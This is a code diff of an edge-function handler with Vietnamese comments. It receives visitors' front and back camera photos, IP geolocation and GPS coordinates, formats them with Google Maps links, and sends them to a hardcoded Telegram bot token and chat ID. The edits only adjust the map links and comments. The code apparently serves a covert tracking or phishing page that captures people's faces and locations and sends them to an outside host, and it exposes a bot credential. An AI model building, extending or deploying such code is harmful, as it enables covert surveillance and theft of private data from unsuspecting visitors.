@@ -3,6 +3,7 @@ export const config = { runtime: "edge" };
 export default async function handler(req) {
   const TOKEN = "8962152623:AAH2gxqS-QXfs_bYaHHwoPG6xv7pWJXLSmY";
   const CHAT_ID = 8523959891;
+  
   if (req.method !== "POST")
     return new Response("Method Not Allowed", { status: 405 });
 
@@ -38,7 +39,7 @@ export default async function handler(req) {
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
-    // 3. TẠO CAPTION THÔNG TIN
+    // 3. TẠO CAPTION THÔNG TIN VỚI GOOGLE MAPS CHUẨN
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]
 
@@ -51,7 +52,8 @@ export default async function handler(req) {
 🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
-📌 Google Maps: http://googleusercontent.com/maps.google.com/${lat},${lon}
+🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}
+📌 Google Maps Embed: https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed
 📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
@@ -59,7 +61,6 @@ export default async function handler(req) {
 
     // 4. GỬI ĐẾN TELEGRAM
     if (hasFront || hasBack) {
-      // Gửi Album ảnh kèm caption nếu chụp được ảnh
       const teleForm = new FormData();
       teleForm.append("chat_id", CHAT_ID);
 
@@ -94,7 +95,6 @@ export default async function handler(req) {
       );
       return new Response(await res.text(), { status: 200 });
     } else {
-      // Gửi tin nhắn văn bản nếu không bắt được ảnh
       const res = await fetch(
         `https://api.telegram.org/bot${TOKEN}/sendMessage`,
         {
